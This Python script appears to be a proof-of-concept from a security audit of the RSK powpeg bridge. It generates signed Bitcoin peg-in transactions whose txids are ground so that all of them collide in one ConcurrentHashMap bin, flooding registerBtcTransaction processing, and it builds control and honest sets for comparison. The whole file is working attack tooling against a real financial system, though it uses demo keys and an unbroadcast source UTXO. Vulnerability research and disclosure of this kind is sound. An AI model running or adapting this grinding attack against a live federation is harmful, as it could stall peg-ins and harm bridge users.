#!/usr/bin/env python3
"""
Build the Bitcoin transactions used by the registerBtcTransaction budget-flood PoC.

Everything here is real:
  * secp256k1 ECDSA, RFC-6979 deterministic nonces (libsecp256k1 through `coincurve`,
    the same library Bitcoin Core uses to sign/verify),
  * legacy SIGHASH_ALL sighash over the real serialised transaction,
  * txid = double-SHA256 of the legacy serialisation, and -- because these are
    non-witness transactions -- wtxid == txid, which is exactly the key used by
    BtcToRskClientFileData.getTransactionProofs() (a ConcurrentHashMap),
  * wtxid grinding against org.bitcoinj.core.Sha256Hash.hashCode()/spread()/bin mask.

Two groups are produced:

  attack/  (40 txs)  500000 sat -> active federation, 2000 sat -> retiring federation,
                     ground so that spread(wtxid.hashCode()) & 0x3ff == 0, i.e. every
                     entry lands in bin 0 of a ConcurrentHashMap with table <= 1024.
  control/ (40 txs)  identical shape and values, but *not* ground. Used as the
                     negative control in ChmOrder.java.

Usage:
    gen_attack_txs.py [--count 40] [--bits 10]
"""

import argparse
import hashlib
import json
import os

from coincurve import PrivateKey, PublicKey

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "generated")

# ---------------------------------------------------------------------------
# Constants taken verbatim from the audited sources
# ---------------------------------------------------------------------------
MIN_PEGIN_SAT = 500_000      # BridgeMainNetConstants.minimumPeginTxValue (rskj 9.0.4:32)
                             # == PegUtils.MINIMUM_PEGIN_TX_VALUE (powpeg-node:25)
RETIRING_SAT = 2_000         # above dust (546), far below the minimum peg-in value
FUNDING_VALUE = 702_000      # per-branch funding value
ATTACK_FEE = 1_200           # ~4 sat/vB over a ~290 vB tx
DUMMY_MIN, DUMMY_MAX = 546, 60_000

# ---------------------------------------------------------------------------
# hashing / encoding
# ---------------------------------------------------------------------------

def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()


def dsha(b: bytes) -> bytes:
    return sha256(sha256(b))


def hash160(b: bytes) -> bytes:
    return hashlib.new("ripemd160", sha256(b)).digest()


def vi(n: int) -> bytes:
    if n < 0xFD:
        return bytes([n])
    if n <= 0xFFFF:
        return b"\xfd" + n.to_bytes(2, "little")
    if n <= 0xFFFFFFFF:
        return b"\xfe" + n.to_bytes(4, "little")
    return b"\xff" + n.to_bytes(8, "little")


def push(data: bytes) -> bytes:
    n = len(data)
    if n < 0x4C:
        return bytes([n]) + data
    if n <= 0xFF:
        return b"\x4c" + bytes([n]) + data
    raise ValueError("push too large")


B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58check(payload: bytes, version: int) -> str:
    data = bytes([version]) + payload
    data += dsha(data)[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    return "1" * (len(data) - len(data.lstrip(b"\0"))) + out


# ---------------------------------------------------------------------------
# scripts
# ---------------------------------------------------------------------------

def p2pkh(pub: bytes) -> bytes:
    return b"\x76\xa9\x14" + hash160(pub) + b"\x88\xac"


def p2sh(redeem: bytes) -> bytes:
    return b"\xa9\x14" + hash160(redeem) + b"\x87"


def multisig_redeem(pubs, m: int) -> bytes:
    s = bytes([0x50 + m])
    for p in pubs:
        s += push(p)
    s += bytes([0x50 + len(pubs)]) + b"\xae"
    return s


# ---------------------------------------------------------------------------
# transaction building
# ---------------------------------------------------------------------------

def ser_tx(ins, outs, version=2, locktime=0) -> bytes:
    b = version.to_bytes(4, "little") + vi(len(ins))
    for txid, vout, script, seq in ins:
        seq_b = seq if isinstance(seq, (bytes, bytearray)) else seq.to_bytes(4, "little")
        b += txid + vout.to_bytes(4, "little") + vi(len(script)) + script + seq_b
    b += vi(len(outs))
    for value, spk in outs:
        b += value.to_bytes(8, "little") + vi(len(spk)) + spk
    return b + locktime.to_bytes(4, "little")


def sighash_all(ins, outs, index: int, prev_script: bytes) -> bytes:
    """Legacy SIGHASH_ALL preimage digest (what Bitcoin Core's SignatureHash returns)."""
    scrubbed = []
    for i, (txid, vout, _script, _seq) in enumerate(ins):
        scrubbed.append((txid, vout, prev_script if i == index else b"", 0xFFFFFFFF))
    return dsha(ser_tx(scrubbed, outs) + (1).to_bytes(4, "little"))


def sign(key: PrivateKey, digest: bytes) -> bytes:
    """DER signature + SIGHASH_ALL byte. coincurve/libsecp256k1 emits low-S DER."""
    return key.sign(digest, hasher=None) + b"\x01"


def spend(key: PrivateKey, prev_txid: bytes, prev_vout: int, prev_script: bytes,
          value: int, outs) -> dict:
    digest = sighash_all([(prev_txid, prev_vout, b"", 0xFFFFFFFF)], outs, 0, prev_script)
    sig = sign(key, digest)
    pub = key.public_key.format(True)
    script_sig = push(sig) + push(pub)
    raw = ser_tx([(prev_txid, prev_vout, script_sig, 0xFFFFFFFF)], outs)
    return {"raw": raw, "txid": dsha(raw), "digest": digest, "sig": sig, "pub": pub}


# ---------------------------------------------------------------------------
# the pending-map hash function, exactly as the JVM computes it
# ---------------------------------------------------------------------------

def sha256hash_hashcode(digest32: bytes) -> int:
    """org.bitcoinj.core.Sha256Hash.hashCode()  (bitcoinj 0.15.6-rsk-6)

        return Ints.fromBytes(bytes[LENGTH - 4], bytes[LENGTH - 3],
                              bytes[LENGTH - 2], bytes[LENGTH - 1]);

    Ints.fromBytes is a big-endian assembly of the four bytes into an int,
    i.e. the LAST four bytes of the hash, not the first four.
    """
    b = digest32
    return ((b[28] & 0xFF) << 24) | ((b[29] & 0xFF) << 16) | ((b[30] & 0xFF) << 8) | (b[31] & 0xFF)


def chm_spread(h: int) -> int:
    """java.util.concurrent.ConcurrentHashMap.spread(): (h ^ (h >>> 16)) & 0x7fffffff"""
    return (h ^ ((h & 0xFFFFFFFF) >> 16)) & 0x7FFFFFFF


def bin_index(digest32: bytes, mask: int) -> int:
    return chm_spread(sha256hash_hashcode(digest32)) & mask


# ---------------------------------------------------------------------------
# builders
# ---------------------------------------------------------------------------

def build_funding(key: PrivateKey, source_txid: bytes, branches: int, branch_value: int):
    """One attacker UTXO fanned out into `branches` outputs (the report's step 1)."""
    pub = key.public_key.format(True)
    owner_script = p2pkh(pub)
    total = branches * branch_value
    fee = 2_000 + branches * 34
    outs = [(branch_value, owner_script)] * branches
    tx = spend(key, source_txid, 0, owner_script, total + fee, outs)
    return tx, total + fee


def build_attack_tx(key, funding_txid, vout, in_value, active_script, retiring_script,
                    bits: int, seed: int):
    """Grind the wtxid until it sits in bin 0 (bits=10 -> mask 0x3ff).

    The grinding knob is the value of an attacker-owned dust output. Every
    attempt re-signs (RFC-6979 over the new sighash), so the txid -- and hence
    the wtxid -- changes; the attacker only keeps the attempt that lands in bin 0.
    """
    pub = key.public_key.format(True)
    owner_script = p2pkh(pub)
    mask = (1 << bits) - 1
    attempts = 0
    while True:
        attempts += 1
        # deterministic pseudo-random walk over the dust value
        dummy = DUMMY_MIN + ((seed * 2654435761 + attempts * 40503) % (DUMMY_MAX - DUMMY_MIN))
        change = in_value - MIN_PEGIN_SAT - RETIRING_SAT - ATTACK_FEE - dummy
        if change <= 0:
            raise RuntimeError("funding value too small")
        outs = [
            (MIN_PEGIN_SAT, active_script),
            (RETIRING_SAT, retiring_script),
            (dummy, owner_script),
            (change, owner_script),
        ]
        tx = spend(key, funding_txid, vout, owner_script, in_value, outs)
        hits = (bits == 0) or (bin_index(tx["txid"], mask) == 0)
        if hits:
            tx["attempts"] = attempts
            tx["dummy"] = dummy
            tx["change"] = change
            tx["fee"] = in_value - MIN_PEGIN_SAT - RETIRING_SAT - dummy - change
            tx["outs"] = outs
            return tx


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--count", type=int, default=40)
    ap.add_argument("--bits", type=int, default=10)
    ap.add_argument("--honest", type=int, default=25)
    args = ap.parse_args()

    for sub in ("attack", "control"):
        os.makedirs(os.path.join(OUT, "txs", sub), exist_ok=True)

    # Attacker wallet (deterministic, demo only).
    key = PrivateKey((1234567890).to_bytes(32, "big"))
    pub = key.public_key.format(True)

    # Federation scripts. The real ones are 2-of-3 P2SH multisig scripts built from
    # the federation members' BTC public keys (ErpFederation.getP2SHScript()); the
    # PoC builds the same shape from fixed keys so the scripts are reproducible.
    active_redeem = multisig_redeem(
        [PrivateKey((7).to_bytes(32, "big")).public_key.format(True),
         PrivateKey((8).to_bytes(32, "big")).public_key.format(True),
         PrivateKey((9).to_bytes(32, "big")).public_key.format(True)], 2)
    retiring_redeem = multisig_redeem(
        [PrivateKey((11).to_bytes(32, "big")).public_key.format(True),
         PrivateKey((12).to_bytes(32, "big")).public_key.format(True),
         PrivateKey((13).to_bytes(32, "big")).public_key.format(True)], 2)
    active_script = p2sh(active_redeem)
    retiring_script = p2sh(retiring_redeem)

    source_txid = dsha(b"poc-source-utxo-not-broadcast")
    funding, funding_in = build_funding(key, source_txid, 2 * args.count, FUNDING_VALUE)

    groups = {"attack": [], "control": []}
    idx = 0
    for group, bits in (("attack", args.bits), ("control", 0)):
        for i in range(args.count):
            tx = build_attack_tx(key, funding["txid"], idx, FUNDING_VALUE,
                                 active_script, retiring_script, bits, seed=idx + 1)
            name = "%s/tx_%02d" % (group, i)
            with open(os.path.join(OUT, "txs", name + ".hex"), "w") as fh:
                fh.write(tx["raw"].hex())
            groups[group].append({
                "index": i,
                "file": name + ".hex",
                "txid": tx["txid"][::-1].hex(),      # display order
                "wtxid": tx["txid"][::-1].hex(),     # legacy input => wtxid == txid
                "size": len(tx["raw"]),
                "fee_sat": tx["fee"],
                "attempts": tx["attempts"],
                "bin": bin_index(tx["txid"], 0x3FF),
                "outputs": [{"value": v, "script": s.hex()} for v, s in tx["outs"]],
            })
            idx += 1

    honest = []
    for i in range(args.honest):
        h = dsha(b"honest-user-pegin-%d" % i)
        honest.append({"wtxid": h[::-1].hex(), "bin": bin_index(h, 0x3FF)})

    manifest = {
        "constants": {
            "min_pegin_sat": MIN_PEGIN_SAT,
            "retiring_sat": RETIRING_SAT,
            "mask_bits": args.bits,
            "attack_fee_sat": ATTACK_FEE,
            "funding_txid": funding["txid"][::-1].hex(),
            "funding_value_per_branch": FUNDING_VALUE,
            "attacker_source_utxo": source_txid[::-1].hex(),
        },
        "scripts": {
            "active_fed_p2sh": active_script.hex(),
            "active_fed_address": b58check(hash160(active_redeem), 5),
            "retiring_fed_p2sh": retiring_script.hex(),
            "retiring_fed_address": b58check(hash160(retiring_redeem), 5),
            "attacker_p2pkh": p2pkh(pub).hex(),
            "attacker_address": b58check(hash160(pub), 0),
        },
        "funding_tx": {"txid": funding["txid"][::-1].hex(), "size": len(funding["raw"]),
                       "in_value": funding_in},
        "attack": groups["attack"],
        "control": groups["control"],
        "honest": honest,
    }
    with open(os.path.join(OUT, "manifest.json"), "w") as fh:
        json.dump(manifest, fh, indent=1)

    # Flat inputs for the JVM harness (one entry per line).
    with open(os.path.join(OUT, "wtxids.txt"), "w") as fh:
        for tx in groups["attack"]:
            fh.write("attack %s\n" % tx["wtxid"])
        for tx in groups["control"]:
            fh.write("control %s\n" % tx["wtxid"])
        for h in honest:
            fh.write("honest %s\n" % h["wtxid"])

    print("funding txid      :", manifest["funding_tx"]["txid"])
    print("active fed        :", manifest["scripts"]["active_fed_address"],
          manifest["scripts"]["active_fed_p2sh"])
    print("retiring fed      :", manifest["scripts"]["retiring_fed_address"],
          manifest["scripts"]["retiring_fed_p2sh"])
    print("attack  txs       : %d  (bin0: %d/%d)  avg attempts %.0f" % (
        len(groups["attack"]),
        sum(1 for t in groups["attack"] if t["bin"] == 0), len(groups["attack"]),
        sum(t["attempts"] for t in groups["attack"]) / max(1, len(groups["attack"]))))
    print("control txs       : %d  (bin0: %d/%d)" % (
        len(groups["control"]),
        sum(1 for t in groups["control"] if t["bin"] == 0), len(groups["control"])))
    print("honest  wtxids    : %d  (bin0: %d/%d)" % (
        len(honest), sum(1 for h in honest if h["bin"] == 0), len(honest)))
    print("written to        :", OUT)


if __name__ == "__main__":
    main()
